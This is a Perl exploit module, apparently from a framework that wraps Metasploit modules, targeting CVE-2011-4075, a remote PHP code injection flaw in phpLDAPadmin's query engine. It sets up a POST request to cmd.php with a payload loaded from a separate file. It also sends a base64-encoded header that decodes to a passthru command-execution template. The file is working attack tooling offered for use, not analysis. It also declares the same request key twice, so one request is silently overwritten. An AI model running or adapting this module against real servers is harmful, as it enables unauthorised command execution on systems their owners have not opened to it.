package MSFExploits::Exploits::PHPLDAPADMIN::MSF::PhpldapadminQueryEngine;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::PHPLDAPADMIN);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "PhpldapadminQueryEngine";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2011-4075",
  DESCRIPTION => "

        This module exploits a vulnerability in the lib/functions.php for

        phpLDAPadmin versions 1.2.1.1 and earlier that allows attackers input

        parsed directly to the create_function() php function. A patch was

        issued that uses a whitelist regex expression to check the user supplied

        input before being parsed to the create_function() call.

      ",
  MSF_MODULE => "phpldapadmin_query_engine",
  OSVDB => 76594,
  TITLE => "phpLDAPadmin query_engine Remote PHP Code Injection",


  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'cmd.php',
      PAYLOAD      => read_file('Exploits/PHPLDAPADMIN/MSF/src/PhpldapadminQueryEngine.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [POST] /cmd.php',
      HEADERS      => {
        'PTUXQX' => 'cGFzc3RocnUoIl9fQ09NTUFORF9fIik7',
        'Cookie' => '',
        'Connection' => 'Close',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
